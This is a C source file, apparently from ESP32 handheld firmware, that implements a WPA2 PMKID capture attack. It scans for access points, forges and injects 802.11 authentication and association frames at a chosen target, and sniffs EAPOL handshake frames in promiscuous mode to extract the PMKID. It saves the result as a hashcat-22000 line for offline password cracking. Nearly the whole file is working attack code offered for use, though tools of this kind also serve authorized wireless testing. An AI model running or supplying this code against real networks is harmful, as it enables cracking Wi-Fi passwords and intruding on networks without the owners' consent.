#include "wifi_pmkid.h"
#include "wifi_scan.h"
#include "ssd1306.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_mac.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "pmkid";

#define FC_FROM_DS(fc1) (((fc1) >> 1) & 0x01)
#define FC_TO_DS(fc1)   ((fc1) & 0x01)
#define FC_SUBTYPE(fc0) (((fc0) >> 4) & 0x0F)

#define MAX_ATTEMPTS     30
#define ATTEMPT_DELAY_MS 300

typedef enum {
    PMKID_STATE_PICK = 0,
    PMKID_STATE_HUNTING,
    PMKID_STATE_CAPTURED,
    PMKID_STATE_FAILED,
} pmkid_state_t;

static pmkid_state_t  state         = PMKID_STATE_PICK;
static uint16_t       scroll_offset = 0;
static uint16_t       selected_idx  = 0;
static uint16_t       target_count  = 0;
static wifi_ap_info_t targets[MAX_SCAN_RESULTS];

static uint8_t  target_bssid[6];
static uint8_t  target_channel;
static char     target_ssid[33];
static uint8_t  our_mac[6];

static volatile bool    pmkid_hunting = false;
static volatile bool    pmkid_refresh = false;
static volatile uint8_t attempt_num   = 0;
static volatile uint16_t frames_sent  = 0;
static TaskHandle_t     pmkid_task_h  = NULL;

static pmkid_capture_t captures[PMKID_MAX_CAPTURES];
static uint8_t         cap_count = 0;
static uint8_t         view_idx  = 0;

// Hashcat line staged in the WiFi callback, written to flash by the task
static char    save_buf[160];
static volatile bool save_ready = false;

// ---------- RSN IE PMKID parser ----------

static bool extract_pmkid(const uint8_t *kd, uint16_t kd_len, uint8_t *out) {
    for (uint16_t i = 0; i + 2 <= kd_len; ) {
        uint8_t tag = kd[i];
        uint8_t len = kd[i + 1];
        if ((uint16_t)(i + 2 + len) > kd_len) break;

        if (tag == 0x30 && len >= 20) {
            const uint8_t *r   = kd + i + 2;
            uint16_t       rlen = len;
            uint16_t       off  = 2;    // skip version

            if (off + 4 > rlen) goto next;
            off += 4;  // group cipher

            if (off + 2 > rlen) goto next;
            uint16_t pw = (uint16_t)(r[off] | (r[off + 1] << 8));
            off += 2 + pw * 4;  // pairwise suites

            if (off + 2 > rlen) goto next;
            uint16_t ak = (uint16_t)(r[off] | (r[off + 1] << 8));
            off += 2 + ak * 4;  // AKM suites

            if (off + 2 > rlen) goto next;
            off += 2;  // RSN capabilities

            if (off + 2 > rlen) goto next;
            uint16_t pc = (uint16_t)(r[off] | (r[off + 1] << 8));
            off += 2;

            if (pc > 0 && (uint16_t)(off + 16) <= rlen) {
                memcpy(out, r + off, 16);
                return true;
            }
        }
next:
        i += 2 + len;
    }
    return false;
}

// ---------- frame builders ----------

static int build_auth_frame(uint8_t *f) {
    f[0] = 0xB0; f[1] = 0x00;              // FC: Authentication
    f[2] = 0x3A; f[3] = 0x01;              // Duration
    memcpy(f +  4, target_bssid, 6);        // Addr1: AP
    memcpy(f + 10, our_mac,      6);        // Addr2: us
    memcpy(f + 16, target_bssid, 6);        // Addr3: BSSID
    f[22] = 0x00; f[23] = 0x00;            // Seq control
    f[24] = 0x00; f[25] = 0x00;            // Algorithm: Open System
    f[26] = 0x01; f[27] = 0x00;            // Auth seq: 1
    f[28] = 0x00; f[29] = 0x00;            // Status: Success
    return 30;
}

static int build_assoc_frame(uint8_t *f) {
    int pos = 0;
    f[pos++] = 0x00; f[pos++] = 0x00;      // FC: Association Request
    f[pos++] = 0x3A; f[pos++] = 0x01;
    memcpy(f + pos, target_bssid, 6); pos += 6;
    memcpy(f + pos, our_mac,      6); pos += 6;
    memcpy(f + pos, target_bssid, 6); pos += 6;
    f[pos++] = 0x00; f[pos++] = 0x00;      // Seq control
    f[pos++] = 0x11; f[pos++] = 0x04;      // Capability: ESS+Privacy+ShortSlot
    f[pos++] = 0x0A; f[pos++] = 0x00;      // Listen interval: 10

    uint8_t ssid_len = (uint8_t)strlen(target_ssid);
    f[pos++] = 0x00; f[pos++] = ssid_len;
    memcpy(f + pos, target_ssid, ssid_len); pos += ssid_len;

    f[pos++] = 0x01; f[pos++] = 0x08;      // Supported Rates IE
    f[pos++] = 0x82; f[pos++] = 0x84; f[pos++] = 0x8B; f[pos++] = 0x96;
    f[pos++] = 0x24; f[pos++] = 0x30; f[pos++] = 0x48; f[pos++] = 0x6C;

    // RSN IE: WPA2-PSK CCMP
    f[pos++] = 0x30; f[pos++] = 0x14;
    f[pos++] = 0x01; f[pos++] = 0x00;      // Version 1
    f[pos++] = 0x00; f[pos++] = 0x0F; f[pos++] = 0xAC; f[pos++] = 0x04;  // CCMP group
    f[pos++] = 0x01; f[pos++] = 0x00;      // 1 pairwise suite
    f[pos++] = 0x00; f[pos++] = 0x0F; f[pos++] = 0xAC; f[pos++] = 0x04;  // CCMP
    f[pos++] = 0x01; f[pos++] = 0x00;      // 1 AKM
    f[pos++] = 0x00; f[pos++] = 0x0F; f[pos++] = 0xAC; f[pos++] = 0x02;  // PSK
    f[pos++] = 0x00; f[pos++] = 0x00;      // RSN capabilities

    return pos;
}

// ---------- promiscuous callback ----------

static void promisc_rx(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!pmkid_hunting) return;
    if (type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 4) return;
    uint16_t frame_len = (uint16_t)(pkt->rx_ctrl.sig_len - 4);  // strip FCS

    // Only AP→client frames (FromDS=1, ToDS=0)
    if (FC_FROM_DS(frame[1]) != 1 || FC_TO_DS(frame[1]) != 0) return;

    // Addr2 = BSSID, must match target
    if (memcmp(frame + 10, target_bssid, 6) != 0) return;

    // QoS Data frames have a 2-byte QoS field after the standard 24-byte header
    uint8_t hdr_len = (FC_SUBTYPE(frame[0]) & 0x08) ? 26 : 24;

    if (frame_len < (uint16_t)(hdr_len + 8 + 99 + 1)) return;

    // LLC/SNAP: must be EAPOL (0x888E)
    const uint8_t *llc = frame + hdr_len;
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[6] != 0x88 || llc[7] != 0x8E) return;

    // EAPOL header
    // [0]=version [1]=type [2-3]=length [4]=key_desc [5-6]=key_info ...
    const uint8_t *eapol = llc + 8;
    if (eapol[1] != 3) return;             // type 3 = EAPOL-Key
    if (eapol[4] != 2) return;             // descriptor 2 = RSN/WPA2

    uint16_t key_info = (uint16_t)((eapol[5] << 8) | eapol[6]);
    if (!(key_info & 0x0080)) return;      // Ack bit set → M1
    if (  key_info & 0x0100)  return;      // MIC bit clear → M1 (not M3)

    // Key Data starts at eapol[99], length at eapol[97-98]
    uint16_t kd_len = (uint16_t)((eapol[97] << 8) | eapol[98]);
    if (kd_len == 0) return;
    if (frame_len < (uint16_t)(hdr_len + 8 + 99 + kd_len)) return;

    uint8_t pmkid[16];
    if (!extract_pmkid(eapol + 99, kd_len, pmkid)) return;

    // Deduplicate
    for (uint8_t i = 0; i < cap_count; i++) {
        if (memcmp(captures[i].pmkid, pmkid, 16) == 0) return;
    }
    if (cap_count >= PMKID_MAX_CAPTURES) return;

    pmkid_capture_t *cap = &captures[cap_count];
    memcpy(cap->pmkid,      pmkid,        16);
    memcpy(cap->bssid,      target_bssid,  6);
    memcpy(cap->client_mac, frame + 4,     6);  // Addr1 = DA = client
    strncpy(cap->ssid, target_ssid, 32);
    cap->ssid[32] = '\0';
    cap->channel = target_channel;
    cap_count++;
    view_idx = cap_count - 1;

    // Stage hashcat-22000 line for the task to write (avoids blocking in callback)
    int bp = 0;
    bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "WPA*02*");
    for (int i = 0; i < 16; i++)
        bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "%02x", pmkid[i]);
    bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "*");
    for (int i = 0; i < 6; i++)
        bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "%02x", target_bssid[i]);
    bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "*");
    for (int i = 0; i < 6; i++)
        bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "%02x", cap->client_mac[i]);
    bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "*");
    for (int i = 0; target_ssid[i]; i++)
        bp += snprintf(save_buf + bp, sizeof(save_buf) - bp, "%02x", (uint8_t)target_ssid[i]);
    snprintf(save_buf + bp, sizeof(save_buf) - bp, "\n");
    save_ready = true;

    state         = PMKID_STATE_CAPTURED;
    pmkid_hunting = false;
    pmkid_refresh = true;
    ESP_LOGI(TAG, "PMKID: %s", target_ssid);
}

// ---------- attack task ----------

static void pmkid_task(void *arg) {
    uint8_t auth_frame[30];
    uint8_t assoc_frame[128];
    int auth_len  = build_auth_frame(auth_frame);
    int assoc_len = build_assoc_frame(assoc_frame);

    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

    for (attempt_num = 1; attempt_num <= MAX_ATTEMPTS && pmkid_hunting; attempt_num++) {
        esp_wifi_80211_tx(WIFI_IF_STA, auth_frame,  auth_len,  false);
        vTaskDelay(pdMS_TO_TICKS(30));
        esp_wifi_80211_tx(WIFI_IF_STA, assoc_frame, assoc_len, false);
        frames_sent += 2;
        pmkid_refresh = true;
        vTaskDelay(pdMS_TO_TICKS(ATTEMPT_DELAY_MS));
    }

    // Write staged capture to flash if we got one
    if (save_ready) {
        FILE *fp = fopen("/lfs/pmkid.log", "a");
        if (fp) { fputs(save_buf, fp); fclose(fp); }
        save_ready = false;
    }

    if (pmkid_hunting) {
        // Exhausted attempts with no capture
        pmkid_hunting = false;
        state         = PMKID_STATE_FAILED;
        pmkid_refresh = true;
    }

    pmkid_task_h = NULL;
    vTaskDelete(NULL);
}

// ---------- public API ----------

void wifi_pmkid_init(void) {
    esp_read_mac(our_mac, ESP_MAC_WIFI_STA);
    ESP_LOGI(TAG, "PMKID module ready");
}

void wifi_pmkid_enter(void) {
    state         = PMKID_STATE_PICK;
    scroll_offset = 0;
    selected_idx  = 0;

    const wifi_ap_info_t *scan = wifi_scan_get_results(&target_count);
    if (target_count > MAX_SCAN_RESULTS) target_count = MAX_SCAN_RESULTS;
    if (scan && target_count > 0) {
        memcpy(targets, scan, sizeof(wifi_ap_info_t) * target_count);
        return;
    }

    ssd1306_clear_buffer();
    ssd1306_draw_header("PMKID", "lazy scan...");
    ssd1306_draw_string(0, 3, "Too lazy 2 scan");
    ssd1306_draw_string(0, 4, "first? Fine...");
    ssd1306_flush();
    vTaskDelay(pdMS_TO_TICKS(1500));

    wifi_scan_start();
    scan = wifi_scan_get_results(&target_count);
    if (target_count > MAX_SCAN_RESULTS) target_count = MAX_SCAN_RESULTS;
    if (scan && target_count > 0) {
        memcpy(targets, scan, sizeof(wifi_ap_info_t) * target_count);
    }
}

void wifi_pmkid_scroll_up(void) {
    if (selected_idx > 0) {
        selected_idx--;
        if (selected_idx < scroll_offset) scroll_offset = selected_idx;
    }
}

void wifi_pmkid_scroll_down(void) {
    if (target_count > 0 && selected_idx < target_count - 1) {
        selected_idx++;
        if (selected_idx >= scroll_offset + 6) scroll_offset = selected_idx - 5;
    }
}

void wifi_pmkid_select(void) {
    if (target_count == 0) return;

    if (targets[selected_idx].security == 0) {
        ssd1306_clear_buffer();
        ssd1306_draw_header("PMKID", "OPEN AP");
        ssd1306_draw_string(0, 3, "Open APs have");
        ssd1306_draw_string(0, 4, "no PMKID!");
        ssd1306_flush();
        vTaskDelay(pdMS_TO_TICKS(1500));
        return;
    }

    memcpy(target_bssid, targets[selected_idx].bssid, 6);
    target_channel = targets[selected_idx].channel;
    strncpy(target_ssid, targets[selected_idx].ssid, 32);
    target_ssid[32] = '\0';
    if (!target_ssid[0]) strncpy(target_ssid, "Hidden", 32);

    frames_sent   = 0;
    attempt_num   = 0;
    save_ready    = false;
    pmkid_hunting = true;
    state         = PMKID_STATE_HUNTING;

    esp_wifi_stop();
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promisc_rx);

    xTaskCreate(pmkid_task, "pmkid", 4096, NULL, 5, &pmkid_task_h);
    ESP_LOGI(TAG, "Hunting PMKID: %s ch%u", target_ssid, target_channel);
}

void wifi_pmkid_view_next(void) {
    if (cap_count > 1) view_idx = (view_idx + 1) % cap_count;
}

void wifi_pmkid_stop(void) {
    pmkid_hunting = false;
    esp_wifi_set_promiscuous(false);
    state = PMKID_STATE_PICK;
    ESP_LOGI(TAG, "PMKID stopped — %u captures", cap_count);
}

bool wifi_pmkid_is_running(void)   { return pmkid_hunting; }
bool wifi_pmkid_is_in_picker(void) { return state == PMKID_STATE_PICK; }
bool wifi_pmkid_is_captured(void)  { return state == PMKID_STATE_CAPTURED; }
uint8_t wifi_pmkid_get_count(void) { return cap_count; }

bool wifi_pmkid_needs_refresh(void) {
    bool v = pmkid_refresh;
    pmkid_refresh = false;
    return v;
}

// ---------- render ----------

static const char *auth_short(uint8_t sec) {
    switch (sec) {
        case 0: return "OPEN"; case 1: return "WEP ";
        case 2: return "WPA "; case 3: return "WPA2";
        case 6: return "WPA3"; case 7: return "WP23";
        default: return "WPA2";
    }
}

static void render_picker(void) {
    ssd1306_clear_buffer();
    if (target_count == 0) {
        ssd1306_draw_header("PMKID", "No APs");
        ssd1306_draw_string(0, 3, " Run WiFi Scan");
        ssd1306_draw_string(0, 4, " first");
        ssd1306_flush();
        return;
    }
    char status[16];
    snprintf(status, sizeof(status), "%u/%u %s",
             selected_idx + 1, target_count,
             auth_short(targets[selected_idx].security));
    ssd1306_draw_header("PMKID", status);
    for (uint8_t row = 0; row < 6; row++) {
        uint16_t idx = scroll_offset + row;
        if (idx >= target_count) break;
        const char *ssid = targets[idx].ssid[0] ? targets[idx].ssid : "Hidden";
        char line[17];
        snprintf(line, sizeof(line), "%c%-10.10s %4d",
                 (idx == selected_idx) ? '>' : ' ',
                 ssid, (int)targets[idx].rssi);
        ssd1306_draw_string(0, row + 2, line);
    }
    ssd1306_flush();
}

static void render_hunting(void) {
    static uint8_t tick = 0;
    static const char spinner[] = "|/-\\";
    tick++;

    ssd1306_clear_buffer();
    char status[16];
    snprintf(status, sizeof(status), "%u/%u", attempt_num, MAX_ATTEMPTS);
    ssd1306_draw_header("PMKID", status);

    char line[17];
    snprintf(line, sizeof(line), "%.16s", target_ssid);
    ssd1306_draw_string(0, 2, line);

    snprintf(line, sizeof(line), "%02X%02X%02X%02X%02X%02X",
             target_bssid[0], target_bssid[1], target_bssid[2],
             target_bssid[3], target_bssid[4], target_bssid[5]);
    ssd1306_draw_string(0, 3, line);

    snprintf(line, sizeof(line), "Ch:%-2u Sent:%-4u",
             target_channel, (unsigned)frames_sent);
    ssd1306_draw_string(0, 4, line);

    snprintf(line, sizeof(line), "%c Hunting...", spinner[tick % 4]);
    ssd1306_draw_string(0, 5, line);

    if (cap_count > 0) {
        snprintf(line, sizeof(line), "Got: %u PMKID", cap_count);
        ssd1306_draw_string(0, 6, line);
    }
    ssd1306_draw_string(0, 7, "LN>cancel");
    ssd1306_flush();
}

static void render_captured(void) {
    ssd1306_clear_buffer();
    char status[16];
    snprintf(status, sizeof(status), "%u cap", cap_count);
    ssd1306_draw_header("PMKID", status);

    pmkid_capture_t *cap = &captures[view_idx];
    char line[17];

    // PMKID: 16 bytes split across two rows (8 bytes = 16 hex chars each)
    snprintf(line, sizeof(line), "%02x%02x%02x%02x%02x%02x%02x%02x",
             cap->pmkid[0], cap->pmkid[1], cap->pmkid[2], cap->pmkid[3],
             cap->pmkid[4], cap->pmkid[5], cap->pmkid[6], cap->pmkid[7]);
    ssd1306_draw_string(0, 2, line);
    snprintf(line, sizeof(line), "%02x%02x%02x%02x%02x%02x%02x%02x",
             cap->pmkid[8],  cap->pmkid[9],  cap->pmkid[10], cap->pmkid[11],
             cap->pmkid[12], cap->pmkid[13], cap->pmkid[14], cap->pmkid[15]);
    ssd1306_draw_string(0, 3, line);

    snprintf(line, sizeof(line), "AP:%02X%02X%02X%02X%02X%02X",
             cap->bssid[0], cap->bssid[1], cap->bssid[2],
             cap->bssid[3], cap->bssid[4], cap->bssid[5]);
    ssd1306_draw_string(0, 4, line);

    snprintf(line, sizeof(line), "%.16s", cap->ssid);
    ssd1306_draw_string(0, 5, line);

    if (cap_count > 1) {
        snprintf(line, sizeof(line), "%u/%u CLK>next", view_idx + 1, cap_count);
    } else {
        snprintf(line, sizeof(line), "Saved /lfs");
    }
    ssd1306_draw_string(0, 6, line);
    ssd1306_draw_string(0, 7, "LN>back");
    ssd1306_flush();
}

static void render_failed(void) {
    ssd1306_clear_buffer();
    ssd1306_draw_header("PMKID", "No PMKID");
    char line[17];
    snprintf(line, sizeof(line), "%.16s", target_ssid);
    ssd1306_draw_string(0, 2, line);
    ssd1306_draw_string(0, 4, "AP did not send");
    ssd1306_draw_string(0, 5, "PMKID. May use");
    ssd1306_draw_string(0, 6, "WPA3 or old AP.");
    ssd1306_draw_string(0, 7, "LN>back CLK>retry");
    ssd1306_flush();
}

void wifi_pmkid_render(void) {
    switch (state) {
        case PMKID_STATE_PICK:     render_picker();   break;
        case PMKID_STATE_HUNTING:  render_hunting();  break;
        case PMKID_STATE_CAPTURED: render_captured(); break;
        case PMKID_STATE_FAILED:   render_failed();   break;
    }
}
